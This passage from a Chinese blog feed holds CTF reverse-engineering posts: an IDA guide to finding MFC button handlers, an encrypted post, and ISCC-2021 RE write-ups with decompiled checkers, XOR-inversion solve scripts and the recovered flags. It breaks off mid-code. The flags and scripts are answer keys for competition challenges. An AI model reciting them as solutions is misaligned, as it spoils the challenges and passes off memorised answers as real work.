        <content type="html"><![CDATA[<h1 id="如何找按钮对应的函数"><a href="#如何找按钮对应的函数" class="headerlink" title="如何找按钮对应的函数"></a>如何找按钮对应的函数</h1><h2 id="1-用rresource-hacke查找资源"><a href="#1-用rresource-hacke查找资源" class="headerlink" title="1. 用rresource hacke查找资源"></a>1. 用rresource hacke查找资源</h2><p>在resource hacke中得到消息框中不同按钮对应的编号，本图：确定对应1，取消对应2，输入框对应1000。</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/1.PNG"></p><h2 id="2-在ida中搜索按钮对应的编号"><a href="#2-在ida中搜索按钮对应的编号" class="headerlink" title="2. 在ida中搜索按钮对应的编号"></a>2. 在ida中搜索按钮对应的编号</h2><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/2.PNG"></p><h2 id="3-创建新的本地型"><a href="#3-创建新的本地型" class="headerlink" title="3. 创建新的本地型"></a>3. 创建新的本地型</h2><p>在Local Types视图中插入下面的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">struct AFX_MSGMAP_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">        UINT nMessage;</span><br><span class="line">        UINT nCode;</span><br><span class="line">        UINT nID;</span><br><span class="line">        UINT nLastID;</span><br><span class="line">        UINT_PTR nSig;</span><br><span class="line">        void (*pfn)(void);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct AFX_MSGMAP</span><br><span class="line">&#123;</span><br><span class="line">  const AFX_MSGMAP *(__stdcall *pfnGetBaseMap)();</span><br><span class="line">  const AFX_MSGMAP_ENTRY *lpEntries;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-导入新的本地型"><a href="#4-导入新的本地型" class="headerlink" title="4. 导入新的本地型"></a>4. 导入新的本地型</h2><p>选中新导入的本地型，右击，Synchronize to idb.</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/3.PNG"></p><h2 id="5-修改数据为新定义结构体格式"><a href="#5-修改数据为新定义结构体格式" class="headerlink" title="5. 修改数据为新定义结构体格式"></a>5. 修改数据为新定义结构体格式</h2><p>选中在第二步找到的数据，由Edit&gt;Structs&gt;Struct var应用新的结构体</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/4.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM-Clang编译器安装和使用</title>
      <link href="2021/05/05/LLVM-Clang%E7%BC%96%E8%AF%91%E5%99%A8%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>2021/05/05/LLVM-Clang%E7%BC%96%E8%AF%91%E5%99%A8%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1df7ef2bfebef91895e1fb8f630d82b9150ee636f33f2e4d6e510196315bcd44">22064b17c03cb0c0e58c99349b6889d0b31470871e725085fde7c8feed9af7efe8b7809489bf57d2043a9a64821b708f33f6e5c225b3f6309b250cc4c11fa1c98a3198fe4978139d318120c71e19b10cd679e23701c116a8d992f47896eeaac8c5d51d46fa33d06de384b92a244b0d31c66886e54967c55714d16ccd0395231d5b4b0bc817093e1dfb8db83ecf6b14f0184f340ffea99c3bf0317bb9a74806b1dbd146dfa4bc1995ba9a42f7cc8f5a91bd49cc913d0e0d4acb6297d8c2967ce4e446072596dc603cbf203ef1d823b3d77e25f93858fb9679caf5eed094e409a8449deafbc92aa8d96da6c006dcd3bcf76e342c643dcc26964b9653c0d6c7cf4daff6487b3005109e97adb1c148e1a8518c2b85102b10e1e88917a591af94e4626fb0890bc97b19e08dd03e04d1e3d72fbfc19dc89b061e1900c2bf71674cc8362a3896f5092e6fe847a0ab6b86b312d9c6f330e9eeceac4ba2117adcd8fc3ff70f210444ffc1d828fbdbfb0b57079239714d9902042ccd4250bc076eb8fb13cdca713a3b98ca3caaae7c935860e4706c60008556452f32ee71572fed6d34e1202c9329e9e408ebae711fe98fb796d5c8e59e505e8fe2051ce484e18a1b810a2317f6a8238d0daa186370907f52081b7c574bda5cb57be1513d4214c808d7e01fbe1dbbf02fb27b08fcd1b81e745daeaffe422c30136730f70c21eb0e9d30211e60b94a7e90a4fb459440868a18c1683ffd3d9aa44c324718841d5fe4fa0a548a6f72fb8efdce76bfe188855a1843950aa7861f7f1353ac309e6afbb604df092cc42e7dd059924616fa4780258c990662098bc9255dc7fd1f6a3d35e4ec9503ff2de6b0a0fea3982ed3155a95427578900a9e214343470b9cc58a003d1fd69349b82682acd09bab468bbcc1d8fc45fb49732c4bced4099addbdeabc9979e60f33f638d4ecaef3db1bc92e55bcaa1165680c52d6f8e11e38bd9b7ccee387655f5002f3ae4ef0e96067d46c58d48b4b4fcf2694cab7678907de1ca11917c3140b68045a8d1bb7901fba49e823fba480caa63e5a3d424c36c215de594763db882914c4e5351fc57ca5468d2f475f5ef0d26396c55370b555e8cc2c48f2634ec35d7557c3c576cf4d43021de1c6ba2be94f22a7d36fa4cce33c23fc5767bdd8c4e581f4fbb62cbb08c94bc722e5ed5a9cfd5f400366194f8db4dad243c61812671a175757af6437a63d7258bded4568db9d32e9623420873d7156e6d4ee17a9ff2d2e331424524e7ea438c2787636155adc29d89f2759efe055cd152c329c4b697d452a6d25f92d9121fc9dbf6fdaf64a070020dcfae931097c4662781f3a579d9789f060022e46a54a36e1aafb3a0ccfd7a1dd58a4b698e9365ac2c8652325fe417eae9b8000889a515242a580e62d967714705c601485a74016f2357a28d23fd81011870906b5951a4473ba0e1141e07c3cf6ea08c0e33befb3fd2720521ab4aa091c09fd762db35c16487aebc385ac2d03c377222e7752afd31a0fbd809eddcf56e41401c6e2a0d6a8fcf24a52ba369da8544cf6697c825bb60b2f8542e23f4fca7dd9207eba88438aecf687e3adecf5c160934b59b8a511e8fdb9ac03658831552aa13e4c07db431dae3a5097305d30da7ee97a9b973d278ab2f08f2fb749a975dc8184d295f720d0ac5c744c3387e4fb34a3ab6bc65413c79e1ec5d9f2dad3f9c006e370dddcc156574b152beddab8ffd589a25e86ea95757398bbd9852b0c311e244165ee902dcbc2a92aace873ecbdc6c66d1bcde305d529c152a14e6b5e2154489b567bc88bd49a76f9c573e16ce43b2104918ecfe07d666a4891f0aa3fa0d0ec3f1ce6646fb7ade40f09fb7a2b13616de76b9c04ec2bc2bbdb6f48a4af2fd892deea64b0086a8d368648bf4f17847883a0b51b91613343df7395ae4e404e196423695203d77979702cf164be115971ea6df0b70639262c20c9e5419f80601f78073d8429c719f78a1ebdfa1282f2e6e750f869a16c5b9c97193fd8283c36c1fe93dbada3cabe773832ad846e8c1d7406389e1ccae4db3fca4f3f1ed78915096f1c490cdb2aa7d9867b744c3466aeb4abfddd60c8491e443fa2752a500611e08c552935c10d487817bdd9d08486deff4ae3842bba63072f23290cab196e6fc2c8674e9618f5c53dd87a9be615685deaed7d02822d3ae9f656e897f86e4910e2eca5f55bceea68b3204bb26543fb8b2b2d6f558c48db0460aba453617b58763d142ed774d6e0cc9a2b850d44cf719201e88be5a70562e39aeed9e22262f2f7cd474524044df159969a3e249ef60e7472ea5c4466e6fbe335ba51c6b11b43476f80e5d0e2b1f6bf02af6791381cc8a1314860a012968c42fba36b9ecdf672cdea808df6b544f562b0c9369398659fb568b8215999b2465a180e73b126767b6eedbdf5836ffc06ad7c4057996dc1e819d65a31d79fd14a30ad6f6ed69b42d6565dc439cbdbbb7a367f10ffe423666d3384e929d9ed84d36a4c13621a5dd81373e4797d4b01abb706acbf3301a7ab4c0a0cbb493250255ea594b86a2a9a09c88fbab5a40c214612f8380745a91b171c442c5d52ee7988aa78e24fce66083fe5093123aa676f4205afee303003f18245ef27f247c986791578086c8dfa0d68a38f77733bede4bff931968527b32dc4c095909a8896c114e7eab6ee17e6a310123a4ddbfa3c98468991c338237a24e3cd1c3cac5f84c6ec79986e4130efc3b8c81d7b21c5eb38a4f73511e7db750f25a3b3c998026c14ce0af1c0fbbe11cb23df4a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC-2021</title>
      <link href="2021/05/01/ISCC-2021/"/>
      <url>2021/05/01/ISCC-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Garden"><a href="#Garden" class="headerlink" title="Garden"></a>Garden</h2><a id="more"></a><p>逆向签到题，一道python逆向。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python 2.7 (62211)</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line"># Compiled at: 2021-02-27 22:29:29</span><br><span class="line">#Powered by BugScaner</span><br><span class="line">import platform, sys, marshal, types</span><br><span class="line"> </span><br><span class="line">def check(s):</span><br><span class="line">    f &#x3D; &#39;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#39;</span><br><span class="line">    if len(s) !&#x3D; len(f):</span><br><span class="line">        return False</span><br><span class="line">    checksum &#x3D; 0</span><br><span class="line">    for a, b in zip(f, s):</span><br><span class="line">        checksum +&#x3D; ord(b) ^ ord(a) ^ 123</span><br><span class="line"> </span><br><span class="line">    return checksum &#x3D;&#x3D; 0</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if sys.version_info.major !&#x3D; 2 or sys.version_info.minor !&#x3D; 7:</span><br><span class="line">    sys.exit(&#39;\xe8\xaf\x95\xe8\xaf\x95 Python 2.7.&#39;)</span><br><span class="line">if len(sys.argv) !&#x3D; 2:</span><br><span class="line">    sys.exit(&#39;usage: bronze.pyc &lt;flag&gt;&#39;)</span><br><span class="line">flag &#x3D; sys.argv[1]</span><br><span class="line">if len(flag) &gt;&#x3D; 32:</span><br><span class="line">    print &#39;\xe5\xa4\xaa\xe9\x95\xbf\xe4\xba\x86.&#39;</span><br><span class="line">    sys.exit(1)</span><br><span class="line">alphabet &#x3D; set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@#$%+&#39;)</span><br><span class="line">for ch in flag:</span><br><span class="line">    if ch not in alphabet:</span><br><span class="line">        print &#39;\xe4\xb8\x8d\xe5\xaf\xb9.&#39;</span><br><span class="line">        sys.exit(1)</span><br><span class="line"> </span><br><span class="line">if check(flag):</span><br><span class="line">    print &#39;\xe5\xb0\xb1\xe6\x98\xaf\xe8\xbf\x99\xe4\xb8\xaa!&#39;</span><br><span class="line">    sys.exit(0)</span><br><span class="line">else:</span><br><span class="line">    print &#39;\xe6\x90\x9e\xe9\x94\x99\xe4\xba\x86.&#39;</span><br><span class="line">    sys.exit(1)&lt;&#x2F;flag&gt;</span><br></pre></td></tr></table></figure><p>逻辑很简单，就是让checksum=0，即 0=ord(b) ^ ord(a) ^ 123，转换一下，flag[i]=0^f[i]^123</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f &#x3D; &#39;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#39;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in f:</span><br><span class="line">    flag+&#x3D;chr(0^123^ord(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{Makka2021Pakka}</p></blockquote><h2 id="汇编大人，时代变了"><a href="#汇编大人，时代变了" class="headerlink" title="汇编大人，时代变了"></a>汇编大人，时代变了</h2><p>这一题给了一个task.ll文件，打开百度后知道是LLVM IR。<br>使用LLVM-Clang编译器将task.ll文件转为可执行文件.<br>之后拖入ida中快乐F5.</p><blockquote><p>main函数</p></blockquote><p><img src="/2021/05/01/ISCC-2021/1.PNG"></p><blockquote><p>check</p></blockquote><p><img src="/2021/05/01/ISCC-2021/2.PNG"></p><p>根据最上面的两句话可猜出，check返回值恒为一或恒为零，然后我先试了else那条路，得到了一个假的falg：___7h15_15_4_f4k3_f14g_y0u_w1ll_f41l_1f_y0u_subm17_17___。<br>可以确定flag在if那条路中，根据check函数即可写出解题脚本，这里我使用了爆破.</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int what[]&#x3D;&#123;0x64, 0x4E, 0x6C, 0x2E, 0x1E, 0x36, 0x38, 0x04, 0x44, 0x12, 0x1C, 0x24, 0x5C, 0x59, 0x3D, 0x0B, 0x5A, 0x78, 0x08, 0x09, 0x76, 0x70, 0x79, 0x33, 0x13, 0x16, 0x20, 0x7E, 0x6B, 0x23, 0x36, 0x45, 0x07, 0x11, 0x2C, 0x22, 0x4A, 0x4A, 0x4F, 0x2E, 0x48, 0x4C, 0x7C, 0x3E, 0x11, 0x0F, 0x6A, 0x18, 0x37, 0x42, 0x1E, 0x2B, 0x12, 0x03, 0x5A, 0x47&#125;;</span><br><span class="line">int secret[]&#x3D;&#123;0x42, 0x0A, 0x7C, 0x5F, 0x22, 0x06, 0x1B, 0x67, 0x37, 0x23, 0x5C, 0x46, 0x0A, 0x29, 0x09, 0x30, 0x51, 0x38, 0x5F, 0x7B, 0x59, 0x13, 0x18, 0x0D, 0x50&#125;;</span><br><span class="line">  int flag[56];</span><br><span class="line">  int i,j;</span><br><span class="line">  for(j&#x3D;32;j&lt;127;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  flag[0]&#x3D;j;</span><br><span class="line">  for(i&#x3D;0;i&lt;56;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  if(i&lt;55)</span><br><span class="line">  flag[i+1]&#x3D;flag[i]^what[i];</span><br><span class="line">  flag[i] &#x3D; flag[i] ^ secret[i % 25];</span><br><span class="line">  printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">  printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/01/ISCC-2021/3.PNG"></p><blockquote><p>ISCC{mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n_!_}</p></blockquote><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>本题和题目描述一样，分析就完事了。<br>拖入32ida，直接就看到了main函数，很常规的输入、变换、比较。</p><blockquote><p>main函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char Str[3]; &#x2F;&#x2F; [esp+11h] [ebp-97h] BYREF</span><br><span class="line">  _BYTE v5[57]; &#x2F;&#x2F; [esp+14h] [ebp-94h] BYREF</span><br><span class="line">  int v6; &#x2F;&#x2F; [esp+4Dh] [ebp-5Bh]</span><br><span class="line">  char v7[64]; &#x2F;&#x2F; [esp+51h] [ebp-57h] BYREF</span><br><span class="line">  char v8[7]; &#x2F;&#x2F; [esp+91h] [ebp-17h] BYREF</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+98h] [ebp-10h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  memset(v5, 0, 4 * (((Str - v5 + 64) &amp; 0xFFFFFFFC) &gt;&gt; 2));</span><br><span class="line">  Str[0] &#x3D; 0x43;</span><br><span class="line">  Str[1] &#x3D; 0xDF;</span><br><span class="line">  Str[2] &#x3D; 0x14;</span><br><span class="line">  v5[0] &#x3D; 3;</span><br><span class="line">  v5[1] &#x3D; 13;</span><br><span class="line">  v5[2] &#x3D; 44;</span><br><span class="line">  v5[3] &#x3D; 9;</span><br><span class="line">  v5[4] &#x3D; 1;</span><br><span class="line">  v5[5] &#x3D; 23;</span><br><span class="line">  v5[6] &#x3D; 23;</span><br><span class="line">  v5[7] &#x3D; 8;</span><br><span class="line">  v5[8] &#x3D; -4;</span><br><span class="line">  v5[9] &#x3D; 43;</span><br><span class="line">  v5[10] &#x3D; -6;</span><br><span class="line">  v5[11] &#x3D; 20;</span><br><span class="line">  v5[12] &#x3D; 23;</span><br><span class="line">  v5[13] &#x3D; -7;</span><br><span class="line">  v5[14] &#x3D; 37;</span><br><span class="line">  v5[15] &#x3D; -11;</span><br><span class="line">  v5[16] &#x3D; 34;</span><br><span class="line">  v5[17] &#x3D; 61;</span><br><span class="line">  v5[18] &#x3D; -50;</span><br><span class="line">  v5[19] &#x3D; 0x18;</span><br><span class="line">  v5[20] &#x3D; 0x16;</span><br><span class="line">  v5[21] &#x3D; 0xA;</span><br><span class="line">  qmemcpy(v8, &quot;REVERSE&quot;, sizeof(v8));</span><br><span class="line">  v9 &#x3D; strlen(Str);</span><br><span class="line">  printf(Format);</span><br><span class="line">  scanf(&quot;%s&quot;, v7);</span><br><span class="line">  mix(v7, v8, v9);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v7[i] !&#x3D; Str[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(Buffer);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(aFlag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>mix函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl mix(char *a1, char *Str, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; &#x2F;&#x2F; dl</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  char v5; &#x2F;&#x2F; [esp+14h] [ebp-24h]</span><br><span class="line">  int n; &#x2F;&#x2F; [esp+18h] [ebp-20h]</span><br><span class="line">  int m; &#x2F;&#x2F; [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  int l; &#x2F;&#x2F; [esp+20h] [ebp-18h]</span><br><span class="line">  size_t k; &#x2F;&#x2F; [esp+24h] [ebp-14h]</span><br><span class="line">  int j; &#x2F;&#x2F; [esp+28h] [ebp-10h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; i &lt; a3; ++i )</span><br><span class="line">    a1[i] -&#x3D; 64;</span><br><span class="line">  for ( j &#x3D; 0; j &lt; a3; ++j )</span><br><span class="line">    a1[j] -&#x3D; a1[j + 1];</span><br><span class="line">  for ( k &#x3D; 0; k &lt; strlen(Str); ++k )</span><br><span class="line">    Str[k] %&#x3D; 64;</span><br><span class="line">  for ( l &#x3D; 0; l &lt; a3; ++l )</span><br><span class="line">    a1[l] +&#x3D; Str[l % 7];</span><br><span class="line">  for ( m &#x3D; 0; a3 &#x2F; 2 &gt; m; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 &#x3D; a1[m];</span><br><span class="line">    a1[m] &#x3D; a1[a3 - m - 1];</span><br><span class="line">    a1[a3 - m - 1] &#x3D; v5;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( n &#x3D; 0; ; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; n;</span><br><span class="line">    if ( n &gt;&#x3D; a3 )</span><br><span class="line">      break;</span><br><span class="line">    if ( (Str[n % 7] &amp; 1) !&#x3D; 0 )</span><br><span class="line">      v3 &#x3D; a1[n] + 2;</span><br><span class="line">    else</span><br><span class="line">      v3 &#x3D; a1[n] + 1;</span><br><span class="line">    a1[n] &#x3D; v3;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数中Str和v5的地址是连续的，所以str+v5就是变化后的flag，mix函数也很简单。</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char v3; &#x2F;&#x2F; dl</span><br><span class="line">    int result; &#x2F;&#x2F; eax</span><br><span class="line">    char v5; &#x2F;&#x2F; [esp+14h] [ebp-24h]</span><br><span class="line">    int n; &#x2F;&#x2F; [esp+18h] [ebp-20h]</span><br><span class="line">    int m; &#x2F;&#x2F; [esp+1Ch] [ebp-1Ch]</span><br><span class="line">    int l; &#x2F;&#x2F; [esp+20h] [ebp-18h]</span><br><span class="line">    size_t k; &#x2F;&#x2F; [esp+24h] [ebp-14h]</span><br><span class="line">    int j; &#x2F;&#x2F; [esp+28h] [ebp-10h]</span><br><span class="line">    int i; &#x2F;&#x2F; [esp+2Ch] [ebp-Ch]</span><br><span class="line">    char flag[25]&#x3D;&#123;0x43, 0xdf, 0x14, 3, 0xD, 0x2C, 9, 1, 0x17, 0x17, 8, 0xFC, 0x2B, 0xFA, 0x14, 0x17, 0xF9, 0x25, 0xF5, 0x22, 0x3D, 0xCE, 0x18, 0x16, 0xA&#125;;</span><br><span class="line">    char Str[7] &#x3D; &quot;REVERSE&quot;;</span><br><span class="line">    int a3 &#x3D; 25;</span><br><span class="line">    for ( k &#x3D; 0; k &lt; 7; ++k )</span><br><span class="line">        Str[k] %&#x3D; 64;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 25 ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ( (Str[i % 7] &amp; 1) !&#x3D; 0 )</span><br><span class="line">            flag[i] -&#x3D; 2;</span><br><span class="line">        else</span><br><span class="line">            flag[i] -&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( m &#x3D; 0; a3 &#x2F; 2 &gt; m; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 &#x3D; flag[m];</span><br><span class="line">        flag[m] &#x3D; flag[a3 - m - 1];</span><br><span class="line">        flag[a3 - m - 1] &#x3D; v5;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( l &#x3D; 0; l &lt; a3; ++l )</span><br><span class="line">        flag[l] -&#x3D; Str[l % 7];</span><br><span class="line">    for ( j &#x3D; 24; j &gt;&#x3D; 0; --j )</span><br><span class="line">        flag[j-1] +&#x3D; flag[j];</span><br><span class="line">    for ( i &#x3D; 0; i &lt; a3; ++i )</span><br><span class="line">        flag[i] +&#x3D; 64;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 25; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{REVERSE_IS_NOT_HARD}</p></blockquote><h2 id="Greedy-Snake"><a href="#Greedy-Snake" class="headerlink" title="Greedy Snake"></a>Greedy Snake</h2><p>用Exeinfo PE查看文件信息</p><p><img src="/2021/05/01/ISCC-2021/4.PNG"></p><p>有upx壳，我用upxshell和upx -d都没有脱掉，然后手动脱壳，ida打开，期间又报了几个错误，不过还是反编译出了主要内容。</p><p><img src="/2021/05/01/ISCC-2021/5.PNG"></p><p>base64解密</p><p><img src="/2021/05/01/ISCC-2021/6.PNG"></p><p>当时没看见12行还有个函数，我直接盲猜是异或，然后试出来是和9异或。<br>之后才发现漏了一个函数，不过也懒得看了，flag已经除了，感觉这题全靠运气…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 